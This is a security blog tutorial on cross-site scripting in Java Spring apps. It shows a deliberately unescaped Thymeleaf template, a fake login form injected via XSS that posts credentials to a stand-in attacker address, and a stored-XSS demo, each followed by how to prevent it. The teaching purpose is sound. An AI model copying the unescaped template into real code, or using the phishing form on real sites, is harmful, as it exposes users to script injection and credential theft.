
https://www.stackhawk.com/blog/java-xss/

/////////
/////////
/////////



Security is one of those areas in software development where it’s really important you get it right. At the same time, it’s often easy to get it wrong, especially in teams that suffer from not-invented-here syndrome and refuse to adopt the best practices and state-of-the-art tools that would prevent many issues from happening. Today we’re here to cover one very specific security problem: Java XSS.

We’ll start by defining XSS, talking very briefly about what it is, its types, and why it can be so dangerous to your applications. After that, we’ll walk you through a list of three XSS examples in Java and show you what you should do to prevent them. Let’s get started.
Find and Fix Security Vulnerabilities
Java XSS: What’s This? Why Should You Care?

“Java XSS” is simply XSS done to a Java app. So, what’s XSS?

We have another post dedicated solely to answering that question, and we suggest you check it out. Here’s the short version, though.

XSS stands for cross-site scripting. This is a type of attack that explores vulnerabilities in websites and injects malicious client-side scripts that are then executed by users. The malicious inject script can cause many different effects, ranging from mostly harmless to potentially catastrophic. A highly successful XSS attack can give the attacker access to the user’s personal data. It’s even possible to hijack the user’s session by stealing their session cookie, in which case the consequences can be dire.
Java XSS Examples

Web applications might suffer an XSS attack regardless of their back-end language. Java is certainly no exception to that. So, we’ll now walk you through three basic examples of what an attempted XSS attack on a Java app could look like and how to prevent them.
Example #1: XSS Through Parameter Injection

For our first example, we’ll show a basic XSS attack that can be done through a query parameter. For the example, we’ll use a Spring Boot app that simply takes a name as an input parameter and then displays “Hello, !”
The Code

Here’s what the app’s controller looks like:
Java

package com.example.demo;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
public class GreetingController {

	@GetMapping("/greeting")
	public String index(@RequestParam(name="name", required=true) String name, Model model) {
		model.addAttribute("name", name);
		return "greeting";
	}
}

The controller defines an index action method, which will be mapped to the /greeting route. The method defines a required string parameter called name. It then adds the received value as an attribute to the model.

Let’s now see our view for this action:
HTML

<!DOCTYPE HTML>
<html xmlns:th="http://www.thymeleaf.org">
<head> 
    <title>Getting Started: Serving Web Content</title> 
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body>
    <p th:utext="'Hello, ' + ${name} + '!'" />
</body>
</html>

As you can see, what’s happening here is quite simple. The name variable, whose value is what the user has passed as a query parameter, gets concatenated to a message that the view then displays inside a tag. No rocket science going on here.
The Attack

If I run the app and pass my name as a query parameter, that’s what I see:
java-xss-img-1 image

Pretty unremarkable, right? So, what’s the problem? Well, let’s start by checking whether we can input some HTML:
java-xss-img-2 image

That’s bad news. We did manage to input HTML code that was parsed and displayed as such. Let’s say we want to run the following line of JavaScript:

Could we do it? Let’s see:
java-xss-img-3 image

As you can see, the current code is insecure. We’ve managed to sneak in and run a harmless snippet of JavaScript. In the same way, a bad actor could certainly run a harmful script. They could send a URL to unsuspecting users, causing them to click those links, passing the malicious script as a parameter. For instance, the attacker could use a malicious script that steals the user’s cookie, effectively hijacking its session.
How to Prevent This

The example above is what we call a reflected or non-persistent XSS. One action you can take against it is to escape user input. The view in our example has a deliberate error, to allow unescaped content to be displayed as it is. Pay attention to the following line:

<p th:utext="'Hello, ' + ${name} + '!'" />

In the line above, we’re using the Thymeleaf templating engine to display the greeting in the view. Notice the usage of the utext attribute processor. That stands for unescaped text and is the reason why HTML tags are being displayed. Let’s solve that by changing the attribute to text:

<p th:text="'Hello, ' + ${name} + '!'" />

Now, if I try to sneak in a piece of JavaScript, this is what I get:
java-xss-img-4 image

Mature frameworks such as Spring usually have security features that, when used correctly, should protect your apps against the most common types of attacks. That’s probably one of the best business cases for using third-party tools like frameworks and libraries: the security goodies they often offer by default.
Example #2: Using a Fake Form to Steal User Credentials

The use cases for XSS are virtually infinite. They’re only bound by the attacker’s ingenuity and your app’s vulnerability. Let’s explore yet another scenario, showing how an attacker can create a fake form to steal user credentials by using XSS.
The Code

For this example, we’ll use the same code samples for the previous one, with one change. We’ll change back the th:text Thymeleaf attribute to th:utext so we can get away with providing HTML tags as inputs.
The Attack

For this attack, the attacker wants to inject and display HTML code for a simple form:
HTML

<h3>LOGIN</h3> 
<form action=http://some-evil-address.com> 
<label for="username">Username:
</label> 
<input type="text" name="username" id="username" /> 
<label for="password">Password:</label> 
<input type="password" name="password" id="password"> 
<input type="submit" value="OK">

Notice that the form’s action attribute points to a URL controlled by the attacker. The idea here is to lure the unsuspecting victim into submitting their credentials using this form. In order to do that, the attacker could simply pass the HTML for the form as a query parameter to the vulnerable site and share that URL with the victim, in what’s called a phishing attack:
java-xss-img-5 image

This is, of course, a toy example. A real attack would probably make use of styling to make the fake form look as realistic as possible, with the intent of luring more people into the trap.
How to Prevent It

As in the previous example, preventing this attack consists of escaping content so tags aren’t displayed. In the case of Thymeleaf templating language, that means using the safe th:text attribute.
Example #3: XSS Through Forms

For our third and final example, we won’t use a code sample. Instead, we’ll use a demo site that is deliberately insecure against XSS, to allow people to practice. Here’s what the site looks like:
java-xss-img-6 image
The Attack

To perform the attack, we’ll exploit the comment functionality of the site, which is not protected. Let’s start by clicking on Agenda. Then, I’ll click on any of the talks listed. I’ll see a form that allows me to input a comment:
java-xss-img-7 image

I’ll enter my name normally. However, my comment will be a JavaScript snippet that displays a message:
java-xss-img-8 image

After submitting the form, the alert will be displayed:
java-xss-img-9 image
How to Prevent It

Since this is a demo site and we have no way of knowing which tech stack was used to build it, I’ll offer no prevention sample code in here. Suffice it to say that the same principles apply: Java or otherwise, you must research and adopt mature tools and frameworks that come with built-in features to counter the most common security vulnerabilities.
Find and Fix Application Security Vulnerabilities with Automated Testing
XSS: More Ways to Prevent It

In this post, we’ve covered some examples of XSS in Java, showing how they can be prevented. We did that after explaining briefly what XSS is about and why it can be such a dangerous threat to the security of your app.

This is the main takeaway from the post: never trust data that comes from outside the application. Always treat any kind of input as suspect until you escape it.

Before escaping, input validation is another valuable strategy when dealing with user input. For some kinds of data, it might make sense to use an “allow-list” approach, where you have a list of the valid data that can be accepted and everything else is denied.

Finally, there are tools at your disposal that can help you not only with XSS but with other types of security threats. You can add those checks to your CI/CD pipeline, allowing you to find threats as early as possible in the software development process.

This post was written by Carlos Schults. Carlos is a consultant and software engineer with experience in desktop, web, and mobile development. Though his primary language is C#, he has experience with a number of languages and platforms. His main interests include automated testing, version control, and code quality.
